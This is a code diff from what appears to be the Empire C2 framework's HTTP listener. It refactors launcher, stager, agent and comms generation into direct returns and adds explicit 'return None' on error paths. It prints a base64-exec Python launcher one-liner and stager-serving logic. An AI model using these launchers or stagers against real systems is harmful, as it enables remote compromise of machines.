@@ -481,8 +481,7 @@ class Listener:
                 )
                 if isinstance(launchEncoded, bytes):
                     launchEncoded = launchEncoded.decode("UTF-8")
-                launcher = f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
-                return launcher
+                return f"echo \"import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('{ launchEncoded }'));\" | python3 &"
             else:
                 return launcherBase
 
@@ -514,16 +513,17 @@ class Listener:
                 self.instance_log.error(
                     f"{listenerName} csharpserver plugin not running"
                 )
+                return None
             else:
-                file_name = compiler.do_send_stager(
+                return compiler.do_send_stager(
                     stager_yaml, "Sharpire", confuse=obfuscate
                 )
-                return file_name
 
         else:
             self.instance_log.error(
                 f"{listenerName}: listeners/http generate_launcher(): invalid language specification: only 'powershell' and 'python' are currently supported for this module."
             )
+            return None
 
     def generate_stager(
         self,
@@ -656,6 +656,7 @@ class Listener:
             log.error(
                 "listeners/http generate_stager(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
             )
+            return None
 
     def generate_agent(
         self,
@@ -740,12 +741,12 @@ class Listener:
             return code
         elif language == "csharp":
             # currently the agent is stagless so do nothing
-            code = ""
-            return code
+            return ""
         else:
             log.error(
                 "listeners/http generate_agent(): invalid language specification, only 'powershell', 'python', & 'csharp' are currently supported for this module."
             )
+            return None
 
     def generate_comms(self, listenerOptions, language=None):
         """
@@ -770,8 +771,7 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             elif language.lower() == "python":
                 template_path = [
@@ -786,15 +786,16 @@ class Listener:
                     "host": host,
                 }
 
-                comms = template.render(template_options)
-                return comms
+                return template.render(template_options)
 
             else:
                 log.error(
                     "listeners/http generate_comms(): invalid language specification, only 'powershell' and 'python' are currently supported for this module."
                 )
+                return None
         else:
             log.error("listeners/http generate_comms(): no language specified!")
+            return None
 
     def start_server(self, listenerOptions):
         """
@@ -848,7 +849,7 @@ class Listener:
                 obfuscation_command = obfuscation_config.command
 
             if stager == "powershell":
-                launcher = self.mainMenu.stagers.generate_launcher(
+                return self.mainMenu.stagers.generate_launcher(
                     listenerName=hop or listenerName,
                     language="powershell",
                     encode=False,
@@ -858,10 +859,9 @@ class Listener:
                     proxy=proxy,
                     proxyCreds=proxyCreds,
                 )
-                return launcher
 
             elif stager == "python":
-                launcher = self.mainMenu.stagers.generate_launcher(
+                return self.mainMenu.stagers.generate_launcher(
                     listenerName=hop or listenerName,
                     language="python",
                     encode=False,
@@ -871,7 +871,6 @@ class Listener:
                     proxy=proxy,
                     proxyCreds=proxyCreds,
                 )
-                return launcher
 
             elif stager == "ironpython":
                 if hop:
@@ -896,8 +895,7 @@ class Listener:
                     launcher, dot_net_version="net40", obfuscate=obfuscation
                 )
                 with open(directory, "rb") as f:
-                    code = f.read()
-                return code
+                    return f.read()
 
             elif stager == "csharp":
                 filename = self.mainMenu.stagers.generate_launcher(
@@ -911,8 +909,7 @@ class Listener:
                 )
                 directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/net35/{filename}.exe"
                 with open(directory, "rb") as f:
-                    code = f.read()
-                return code
+                    return f.read()
             else:
                 return make_response(self.default_response(), 404)
 
@@ -926,6 +923,7 @@ class Listener:
                 message = f"{listenerName}: {request.remote_addr} on the blacklist/not on the whitelist requested resource"
                 self.instance_log.info(message)
                 return make_response(self.default_response(), 404)
+            return None
 
         @app.after_request
         def change_header(response):
@@ -1095,6 +1093,7 @@ class Listener:
                             message = f"{listenerName}: Results are None for {request_uri} from {clientIP}"
                             self.instance_log.debug(message)
                             return make_response(self.default_response(), 200)
+                    return None
                 else:
                     return make_response(self.default_response(), 200)
 
@@ -1219,6 +1218,7 @@ class Listener:
                             return make_response(results, 200)
                     else:
                         return make_response(self.default_response(), 404)
+                return None
             else:
                 return make_response(self.default_response(), 404)
 
